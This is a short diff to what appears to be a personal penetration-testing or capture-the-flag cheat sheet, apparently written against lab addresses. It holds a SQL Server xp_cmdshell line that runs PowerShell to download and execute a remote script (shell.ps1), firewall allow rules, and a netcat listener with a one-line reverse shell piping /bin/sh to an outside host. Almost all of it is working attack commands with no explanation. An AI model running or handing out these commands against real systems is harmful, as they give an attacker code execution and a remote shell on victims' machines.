@@ -35,3 +35,14 @@ ufw allow from 10.10.10.27 proto tcp to any port 80,443
 
 
 xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.26/shell.ps1\");"
+
+
+
+#####check out later
+sudo ufw allow from 10.10.10.27
+sudo ufw status
+
+
+######basic reverse shell
+nc -nlvp 5555
+/bin/sh | nc 10.10.14.52 5555
